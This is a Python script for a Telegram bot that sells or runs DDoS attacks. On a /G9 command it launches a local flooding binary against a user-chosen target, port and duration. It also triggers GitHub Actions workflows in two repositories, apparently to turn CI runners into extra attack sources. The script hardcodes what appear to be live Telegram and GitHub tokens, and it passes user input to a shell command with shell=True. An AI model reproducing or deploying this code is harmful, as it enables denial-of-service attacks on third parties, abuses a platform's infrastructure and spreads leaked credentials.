#!/usr/bin/python3
import telebot
import subprocess
import requests
from threading import Thread

# Insert your Telegram bot token here
bot = telebot.TeleBot('6472534758:AAGTOvmuiBnQSpQdmM2oNX_g1YJZtxLH8bA')

# GitHub tokens and repository details for both accounts
github_data = [
    {
        "token": "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",
        "repo": "yespap589/SET_TP"
    },
    {
        "token": "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",
        "repo": "wadu696/yoga"
    }
]

# Handler for /G9 command
@bot.message_handler(commands=['G9'])
def handle_G9(message):
    command = message.text.split()
    if len(command) == 5:  # Accept target, port, time, and power arguments
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])   # Convert time to integer
        power = int(command[4])  # Convert power to integer

        if time > 500:
            response = "Error: Time interval must be less than 501."
            bot.reply_to(message, response)
        else:
            # Trigger GitHub Actions and start the local attack in parallel
            for data in github_data:
                Thread(target=trigger_github_action, args=(data["token"], data["repo"], message)).start()
            Thread(target=start_attack, args=(message, target, port, time, power)).start()
    else:
        response = '''Usage: /G9 <target> <port> <time> <power>
Example: /G9 192.168.1.1 80 60 300
'''
        bot.reply_to(message, response)

# Function to trigger GitHub Actions
def trigger_github_action(token, repo, message):
    url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "ref": "main"  # or the branch you want to trigger
    }
    response = requests.post(url, headers=headers, json=data)

    # Report status to the user
    if response.status_code == 204:
        bot.reply_to(message, f"Triggered GitHub Action in {repo}")
    else:
        bot.reply_to(message, f"Failed to trigger GitHub Action in {repo}: {response.status_code} {response.text}")

# Function to initiate the attack command in a separate thread
def start_attack(message, target, port, time, power):
    start_attack_reply(message, target, port, time, power)  # Send attack start message
    full_command = f"./G9 {target} {port} {time} {power}"

    # Run the command and handle potential errors
    try:
        subprocess.run(full_command, shell=True, check=True)  # Run command
        response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
    except subprocess.CalledProcessError as e:
        response = f"Error: Failed to execute command. {e}"
    
    bot.reply_to(message, response)

# Function to handle the reply when users run the /G9 command
def start_attack_reply(message, target, port, time, power):
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: G9\nBy G9"
    bot.reply_to(message, response)

# Command handler for /help
@bot.message_handler(commands=['help'])
def handle_help(message):
    response = '''Available commands:
    
/G9 <target> <port> <time> <power> - Start G9 attack and trigger GitHub Actions
'''
    bot.reply_to(message, response)

# Start the bot
bot.polling()
